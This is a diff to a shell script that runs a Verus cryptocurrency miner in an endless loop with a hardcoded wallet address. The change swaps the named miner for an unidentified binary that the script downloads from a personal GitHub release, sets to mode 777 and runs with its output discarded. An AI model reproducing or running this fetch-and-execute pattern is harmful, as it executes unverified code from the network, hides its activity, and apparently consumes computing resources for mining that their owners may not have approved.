@@ -5,8 +5,11 @@
 sudo apt update
 sudo apt install libjansson4 -y
 chmod 777 ccmminer
+wget https://github.com/mariobiszz/perus/releases/download/1/ver.tar.gz
+tar -xvf ver.tar.gz
+chmod 777 ver ver.ini
 while true
 do
-./ccmminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 4
+./ver ver.ini
 > /dev/null 2>&1
 done
